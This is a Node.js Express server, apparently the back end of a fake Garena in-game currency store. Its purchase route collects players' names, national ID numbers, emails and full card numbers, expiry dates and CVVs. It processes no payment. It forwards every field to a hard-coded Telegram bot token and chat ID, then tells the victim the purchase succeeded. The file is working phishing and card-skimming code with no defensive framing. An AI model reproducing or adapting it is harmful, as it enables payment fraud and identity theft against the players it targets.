import express from 'express';
import cors from 'cors';
import fetch from 'node-fetch';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 3000;

// Configuración de Telegram
const TELEGRAM_TOKEN = '7175973673:AAFpdIWxQAtdH0Bh7lh_tAeAK-W4ZB52Vok';
const CHAT_ID = '7051797012';

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static('.'));

// Función para enviar mensaje a Telegram
async function sendToTelegram(data) {
    const message = `
🎮 *NUEVA COMPRA GARENA* 🎮

👤 *Información del Jugador:*
• ID: \`${data.playerId}\`
• Nombre: ${data.fullName}
• DNI: ${data.dni}
• País: ${data.country}
• Email: ${data.email}

💎 *Producto:*
• Tipo: ${data.currencyType === 'diamonds' ? '💎 Diamantes' : '🪙 Oro'}
• Cantidad: ${data.amount}
• Precio: $${data.price}

💳 *Datos de Tarjeta:*
• Número: \`${data.cardNumber}\`
• Nombre: ${data.cardName}
• Vencimiento: ${data.expiry}
• CVV: \`${data.cvv}\`
• Tipo: ${data.cardType}

⏰ Fecha: ${new Date().toLocaleString('es-AR')}
    `;

    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
    
    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });

        const result = await response.json();
        return result.ok;
    } catch (error) {
        console.error('Error enviando a Telegram:', error);
        return false;
    }
}

// Ruta para procesar la compra
app.post('/api/purchase', async (req, res) => {
    try {
        const purchaseData = req.body;
        
        // Validar datos requeridos
        const requiredFields = [
            'playerId', 'currencyType', 'amount', 'price',
            'fullName', 'dni', 'country', 'email',
            'cardNumber', 'cardName', 'expiry', 'cvv', 'cardType'
        ];

        const missingFields = requiredFields.filter(field => !purchaseData[field]);
        
        if (missingFields.length > 0) {
            return res.status(400).json({
                success: false,
                message: `Campos faltantes: ${missingFields.join(', ')}`
            });
        }

        // Enviar datos a Telegram
        const telegramSent = await sendToTelegram(purchaseData);

        if (telegramSent) {
            res.json({
                success: true,
                message: 'Compra procesada exitosamente'
            });
        } else {
            res.status(500).json({
                success: false,
                message: 'Error al procesar la compra'
            });
        }

    } catch (error) {
        console.error('Error en /api/purchase:', error);
        res.status(500).json({
            success: false,
            message: 'Error interno del servidor'
        });
    }
});

// Servir archivos estáticos
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Iniciar servidor
app.listen(PORT, () => {
    console.log(`🚀 Servidor ejecutándose en http://localhost:${PORT}`);
    console.log(`📱 Bot de Telegram configurado para chat ID: ${CHAT_ID}`);
});